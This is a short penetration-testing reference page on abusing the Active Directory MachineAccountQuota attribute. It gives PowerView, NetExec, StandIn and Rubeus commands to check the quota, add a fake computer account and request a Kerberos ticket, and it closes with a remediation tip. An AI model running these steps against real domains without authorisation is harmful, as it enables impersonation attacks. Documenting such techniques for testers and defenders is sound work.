---
layout: default
title: MachineAccountQuota Abuse
parent: Active Directory
nav_order: 1
permalink: /ad/quota/
---

# MachineAccountQuota Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

By default, any domain user can add up to 10 computers into the domain they belong to. This feature is controlled by the attribute `ms-DS-MachineAccountQuota`. You can leverage this feature to add your own fake computer, one which you are local administrator. It could help you for impersonation attacks like [S4U2Self Abuse](/ad/s4u2self) or Kerberos Relay attacks.

## Prerequisites

* Attribute `ms-DS-MachineAccountQuota` must be `> 0` for a domain principal you control.

## Exploit

The attribute `ms-DS-MachineAccountQuota` is generally set at the root level of the domain. To check its value, use one of the following commands.

```powershell
# Replace with the appropriate Dinstinguished Name.
Get-DomainObject -Identity "DC=$sub,DC=$company,DC=$com" -Properties ms-DS-MachineAccountQuota

# Using NetExec.
nxc ldap -d $Domain -u $Username -p $Password -M maq
```

If you can a new computer account to the domain, use [StandIn](https://github.com/FuzzySecurity/StandIn) to do it.

```powershell
# Generate the fake computer and add it to the domain.
./StandIn.exe --computer $ComputerName --make

# Compute hashes of the newly created computer.
./Rubeus.exe hash /password:$NewComputerPassword /user:$ComputerName$ /domain:$domain

# Ask a TGT for it.
./Rubeus.exe asktgt /user:$ComputerName$ /aes256:$hash /nowrap
```

## Recommendations

- [ ] Set `ms-DS-MachineAccountQuota` to `0` for all domain users if possible, or at least for unprivileged users.